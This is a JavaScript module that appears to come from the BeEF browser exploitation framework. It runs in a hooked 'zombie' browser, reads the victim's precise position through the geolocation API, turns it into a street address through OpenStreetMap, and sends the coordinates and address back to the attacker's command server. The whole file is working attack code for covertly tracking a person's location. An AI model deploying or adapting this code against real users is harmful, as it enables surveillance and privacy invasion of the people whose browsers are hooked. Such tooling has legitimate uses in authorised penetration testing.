/*!
 * @literal object: beef.geolocation
 *
 * Provides functionalities to use the geolocation API.
 */
beef.geolocation = {

    /**
     * check if browser supports the geolocation API
     */
    isGeolocationEnabled: function(){
		return !!navigator.geolocation;
    },

    /*
     * given latitude/longitude retrieves exact street position of the zombie
     */
    getOpenStreetMapAddress: function(command_url, command_id, latitude, longitude){
        beef.net.request(
			 'http://nominatim.openstreetmap.org/reverse?format=json&lat=' + latitude + '&lon=' + longitude + '&zoom=18&addressdetails=1',
		     'GET',
			 function(response) {
                 if(response.length > 0) {
                     var jsonData = JSON.parse(response);
                     beef.net.sendback(command_url, command_id, "latitude=" + latitude
                             + "&longitude=" + longitude
                             + "&openStreetMap=" + escape(jsonData.display_name)
                             + "&geoLocEnabled=True");
                 }
             },
			 ''
        );
    },

    /*
     * retrieve latitude/longitude using the geolocation API
     */
    getGeolocation: function (command_url, command_id){

        if (!navigator.geolocation) {
	        beef.net.sendback(command_url, command_id, "latitude=NOT_ENABLED&longitude=NOT_ENABLED&geoLocEnabled=False");	
			return;
		}
		
        navigator.geolocation.getCurrentPosition( //note: this is an async call
			function(position){ // success
				var latitude = position.coords.latitude;
        		var longitude = position.coords.longitude;
                beef.geolocation.getOpenStreetMapAddress(command_url, command_id, latitude, longitude);

			}, function(error){ // failure
					switch(error.code) // Returns 0-3
					{
						case 0:
			            	beef.net.sendback(command_url, command_id, "latitude=UNKNOWN_ERROR&longitude=UNKNOWN_ERROR&geoLocEnabled=False");
							return;
						case 1:
		            		beef.net.sendback(command_url, command_id, "latitude=PERMISSION_DENIED&longitude=PERMISSION_DENIED&geoLocEnabled=False");
							return;
						case 2:
		            		beef.net.sendback(command_url, command_id, "latitude=POSITION_UNAVAILABLE&longitude=POSITION_UNAVAILABLE&geoLocEnabled=False");
							return;
						case 3:
					   		beef.net.sendback(command_url, command_id, "latitude=TIMEOUT&longitude=TIMEOUT&geoLocEnabled=False");
							return;
					}
            	beef.net.sendback(command_url, command_id, "latitude=UNKNOWN_ERROR&longitude=UNKNOWN_ERROR&geoLocEnabled=False");
			},
			{enableHighAccuracy:true, maximumAge:30000, timeout:27000}
		);
    }
}


beef.regCmp('beef.geolocation');